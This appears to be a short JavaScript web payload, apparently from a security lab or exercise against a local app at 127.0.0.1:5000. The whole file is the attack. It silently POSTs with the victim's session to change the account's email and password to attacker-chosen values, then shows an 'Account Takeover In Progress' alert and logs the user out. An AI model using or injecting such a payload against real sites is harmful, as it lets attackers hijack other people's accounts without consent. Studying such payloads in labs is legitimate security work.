fetch("http://127.0.0.1:5000/profile", {
  method: "POST",
  credentials: "same-origin",
  body: new URLSearchParams({
    email: "pwned@monash.com",
    password: "igoturpassword",
  }),
})
  .then((response) =>
    console.log(response.status),
  )
  .catch(console.error);

alert("Account Takeover In Progress!!\nLogging out current user")
window.location.href = "http://127.0.0.1:5000/logout";

